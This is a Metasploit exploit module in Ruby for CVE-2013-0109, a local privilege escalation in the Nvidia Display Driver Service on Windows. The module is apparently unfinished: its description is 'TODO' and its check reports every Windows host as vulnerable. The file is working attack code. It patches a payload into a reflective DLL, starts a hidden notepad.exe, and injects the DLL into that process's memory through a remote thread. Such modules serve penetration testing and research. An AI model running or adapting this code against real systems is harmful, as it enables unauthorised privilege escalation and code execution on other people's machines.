##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/process'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking

	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process
	include Msf::Post::Windows::Services

	def initialize(info={})
		super(update_info(info, {
			'Name'           => 'Nvidia Display Driver Service Local Privilege Escalation',
			'Description'    => %q{
			TODO
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Peter Wintersmith', # Original exploit
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',   # Metasploit integration
				],
			'Arch'           => ARCH_X86_64,
			'Platform'       => 'win',
			'SessionTypes'   => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'Payload'        =>
				{
					'Space'       => 2048,
					'DisableNops' => true
				},
			'References'     =>
				[
					[ 'CVE', '2013-0109' ],
					[ 'OSVDB', '88745' ],
					[ 'URL', 'http://nvidia.custhelp.com/app/answers/detail/a_id/3288' ],
				],
			'DisclosureDate' => 'Dec 25 2012',
			'DefaultTarget'  => 0
		}))

	end

	def check
		os = sysinfo["OS"]
		if os =~ /windows/i
			return Exploit::CheckCode::Vulnerable
		end
	
		# TODO: Check for service
	end

        def create_proc()
                windir = expand_path("%windir%")
                cmd = "#{windir}\\system32\\notepad.exe"
                return session.sys.process.execute(cmd, nil, {'Hidden' => true }).pid
        end

	def exploit
                dll = ''
                offset = nil
                file = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-0109", "exploit.dll")
                File.open( file,"rb" ) { |f| dll += f.read(f.stat.size) }

                pay = payload.encoded

                bo = dll.index('PAYLOAD:')
                raise RuntimeError, "Invalid Win32 PE DLL template: missing \"PAYLOAD:\" tag" if not bo
               	dll[bo, pay.length] = [pay].pack("a*")

                pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )

                pe.exports.entries.each do |entry|
                        if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
                                offset = pe.rva_to_file_offset( entry.rva )
                                break
                        end
                end

                print_error("No offset found") unless offset

                new_pid = create_proc

                if not new_pid
                        fail_with(Exploit::Failure::Unknown, "Failed to create a new process")
                end

                vprint_status("Injecting payload into memory")
                host_process = session.sys.process.open(new_pid.to_i, PROCESS_ALL_ACCESS)
                mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
                host_process.memory.protect(mem)
                host_process.memory.write(mem, dll)
		host_process.thread.create(mem+offset)
	end


end
